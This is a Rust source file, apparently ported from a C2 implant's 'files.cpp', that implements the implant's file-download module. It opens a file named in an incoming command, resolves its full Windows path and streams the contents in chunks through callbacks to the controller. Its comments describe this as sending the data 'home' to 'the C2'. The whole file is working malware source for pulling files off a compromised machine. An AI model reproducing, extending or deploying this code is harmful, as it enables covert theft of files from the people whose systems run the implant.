//! Port of files.cpp — download tracking.

use crate::bformat::bformat_init;
use crate::callback::{post_error_s, Callback};
use crate::commands::{CALLBACK_FILE, CALLBACK_FILE_CLOSE, CALLBACK_FILE_WRITE, MAX_PACKET};
use crate::parse::DataP;
use parking_lot::Mutex;
use std::io::Read;
use std::sync::atomic::{AtomicU32, Ordering};
use windows_sys::Win32::Storage::FileSystem::GetFullPathNameA;

/// An entry in the download list (file_entry).
struct FileEntry {
    id: u32,
    toread: u32,
    handle: Option<std::fs::File>,
}

/// Track our open downloads (download_list). download_poll() cleans this
/// list up; on exit pending downloads would not be cleaned up (same as C++).
static DOWNLOAD_LIST: Mutex<Vec<FileEntry>> = Mutex::new(Vec::new());

/// Track download identifiers (download_id).
static DOWNLOAD_ID: AtomicU32 = AtomicU32::new(0);

/// Shared buffer used for reading file data (read_buffer).
static READ_BUFFER: Mutex<Vec<u8>> = Mutex::new(Vec::new());

/// Download some content.
pub fn command_download(buffer: &[u8], length: usize, cb: Callback) {
    // allocate the memory we need
    let mut chunk = vec![0u8; 4096];
    let (fname, fullname) = chunk.split_at_mut(2048);

    // determine the file name (data_string_oneoff: the whole payload is the
    // string, copied and NUL terminated)
    let mut data = buffer[..length].to_vec();
    let parser = DataP::init(&mut data);
    let fname_len = parser.data_length();
    if (fname_len + 1) < 2048 {
        fname[..fname_len].copy_from_slice(&parser.data_buffer()[..fname_len]);
        fname[fname_len] = 0;
    }

    // open the file for reading
    let fname_str = std::ffi::CStr::from_bytes_until_nul(fname)
        .map(|c| c.to_bytes())
        .unwrap_or(b"");
    let infile = match std::fs::File::open(std::path::Path::new(std::str::from_utf8(fname_str).unwrap_or(""))) {
        Ok(f) => f,
        Err(_) => {
            post_error_s(0x28, fname_str);
            return;
        }
    };

    // compute the file size (stored in fsz)
    let fsz = infile.metadata().map(|m| m.len() as i64).unwrap_or(-1);

    // if this part failed, report an error to the user
    if fsz <= 0 || fsz > 0xffff_ffff {
        post_error_s(0x3c, fname_str);
        return;
    }

    // get the file's full path
    let nsz = unsafe {
        GetFullPathNameA(
            fname.as_ptr(),
            2048,
            fullname.as_mut_ptr(),
            std::ptr::null_mut(),
        )
    };
    if nsz == 0 || nsz > 2048 {
        post_error_s(0x3d, fname_str);
        return;
    }

    // create a new download entry (now is a good time). The entry is freed in
    // download_poll() once fully processed or stopped.
    let id = DOWNLOAD_ID.fetch_add(1, Ordering::SeqCst);
    let mut list = DOWNLOAD_LIST.lock();
    list.push(FileEntry {
        id,
        toread: fsz as u32,
        handle: Some(infile),
    });

    // CALLBACK_FILE
    //   int4             = download identifier
    //   int4             = file size
    //   char[..length..] = file name (full path)
    let mut builder = bformat_init(4096);
    builder.bformat_int(id as i32);
    builder.bformat_int(fsz as i32);
    builder.bformat_copy(&fullname[..nsz as usize]);

    // send the data...
    let built = builder.bformat_string();
    cb(built, builder.bformat_length() as i32, CALLBACK_FILE);

    // clean up resources
    builder.free();

    // check if we're already done (fsz == 0; unreachable since fsz <= 0
    // errors out above)
    if fsz == 0 {
        if let Some(entry) = list.iter_mut().find(|e| e.id == id) {
            process_close(entry, cb);
        }
    }
}

/// Process a download: read some data and send it home.
fn process_download(entry: &mut FileEntry, cb: Callback, max: usize) {
    // make sure we have a read buffer... our downloads need it
    let mut rb = READ_BUFFER.lock();
    if rb.is_empty() {
        rb.resize(MAX_PACKET + 4, 0);
    }

    // copy the download id into the read buffer
    let temp = entry.id.to_be_bytes(); // htonl
    rb[..4].copy_from_slice(&temp);

    // how much data do we want to read?
    let mut len: usize = 0;
    let mut readme: usize = if entry.toread as usize > max {
        max
    } else {
        entry.toread as usize
    };
    // never read past our shared buffer (defensive; callers pass <= MAX_PACKET)
    readme = readme.min(rb.len() - 4);

    // if there's a lot of data to read, read as much as we can
    while readme > 0 {
        // check for an error during the download... this is important because
        // if we don't catch this, we'll loop forever. The C2 needs to react to
        // CALLBACK_FILE_CLOSE to check that received data < size and infer an
        // error occurred
        let read = match entry.handle.as_mut() {
            Some(f) => f.read(&mut rb[4 + len..4 + len + readme]).unwrap_or(0),
            None => 0,
        };
        if read == 0 {
            entry.toread = 0;
            break;
        }
        len += read;
        readme -= read;
        entry.toread -= read as u32;
    }

    // send all the data home
    cb(&rb[..len + 4], (len + 4) as i32, CALLBACK_FILE_WRITE);

    // close the file if needed
    process_close(entry, cb);
}

/// Handle the close of a finished download (process_close).
fn process_close(entry: &mut FileEntry, cb: Callback) {
    // close the file if needed
    if entry.toread <= 0 {
        let temp = entry.id.to_be_bytes(); // htonl
        cb(&temp, 4, CALLBACK_FILE_CLOSE);
        entry.handle.take(); // fclose
    }
}

/// Stop a download by its file id.
pub fn command_download_stop(buffer: &[u8], length: usize) {
    // copy the 4 bytes to our file id
    let mut fid_bytes = [0u8; 4];
    let n = length.min(4);
    fid_bytes[..n].copy_from_slice(&buffer[..n]);
    let fid = u32::from_be_bytes(fid_bytes); // ntohl

    let mut list = DOWNLOAD_LIST.lock();
    for entry in list.iter_mut() {
        if entry.id == fid {
            // make us no longer process this file download
            entry.toread = 0;

            // close the handle
            entry.handle.take(); // fclose
        }
    }
}

/// Poll the open files. Read some data and send it to the client.
pub fn download_poll(cb: Callback, max: usize) {
    let mut list = DOWNLOAD_LIST.lock();

    // process the downloads
    for entry in list.iter_mut() {
        if entry.toread > 0 {
            process_download(entry, cb, max);
        }
    }

    // clean up our list (entries with nothing left to read are freed)
    list.retain(|e| e.toread > 0);
}
